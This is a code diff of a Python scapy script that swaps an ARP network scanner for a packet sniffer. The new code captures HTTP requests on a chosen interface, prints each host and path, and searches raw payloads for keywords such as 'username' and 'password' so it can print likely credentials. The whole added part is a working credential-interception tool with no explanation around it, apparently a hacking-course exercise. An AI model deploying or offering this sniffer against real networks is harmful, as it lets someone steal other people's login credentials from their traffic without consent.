@@ -1,31 +1,26 @@
 #!/usr/bin/env python
 import scapy.all as scapy
 import argparse
-
-def get_arguments():
+from scapy.layers import http
+def get_interface():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target", help="Sepcify target ip or ip range")
-    options = parser.parse_args()
-    return  options
+    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
+    arguments = parser.parse_args()
+    return arguments.interface
 
-def scan(ip):
-    arp_packet = scapy.ARP(pdst=ip)
-    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_broadcast_packet = broadcast_packet/arp_packet
-    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
-    client_list = []
+def sniff(iface):
+    scapy.sniff(iface=iface, store=False, prn=process_packet)
 
-    for element in answered_list:
-        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-        client_list.append(client_dict)
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keys = ["username", "password", "pass", "email"]
+            for key in keys:
+                if key in load:
+                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
+                    break
 
-    return client_list
-
-def print_result(scan_list):
-    print("IP\t\t\tMAC\n----------------------------------------")
-    for client in scan_list:
-        print(client["ip"] + "\t\t" + client["mac"])
-
-options = get_arguments()
-result_list = scan(options.target)
-print_result(result_list)
+iface = get_interface()
+sniff(iface)
